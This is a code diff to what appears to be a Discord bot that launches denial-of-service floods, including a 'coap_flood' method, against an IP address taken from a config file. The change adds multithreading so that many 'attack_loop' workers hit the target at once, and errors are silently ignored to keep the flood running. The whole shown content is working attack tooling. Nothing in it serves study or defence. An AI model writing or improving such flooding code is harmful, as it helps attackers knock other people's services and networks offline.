@@ -4,6 +4,7 @@ import json
 import random
 import time
 import socket
+import threading
 import discord
 from discord.ext import commands
 from discord import app_commands
@@ -138,16 +139,28 @@ def coap_flood(ip, port=5683):
 method_map = {name: globals()[name] for name in working_methods}
 
 def runner_mode():
-    cfg = json.load(open(CONFIG_FILE))
+    with open(CONFIG_FILE) as f:
+        cfg = json.load(f)
+
     func = method_map.get(cfg["method"])
     if not func:
         return
+
+    threads = max(1, int(cfg.get("threads", 1)))
     end_time = time.time() + cfg["duration"]
-    while time.time() < end_time:
-        try:
-            func(cfg["ip"])
-        except:
-            pass
+
+    def attack_loop():
+        while time.time() < end_time:
+            try:
+                func(cfg["ip"])
+            except Exception:
+                pass
+
+    workers = [threading.Thread(target=attack_loop) for _ in range(threads)]
+    for t in workers:
+        t.start()
+    for t in workers:
+        t.join()
 
 @bot.event
 async def on_ready():
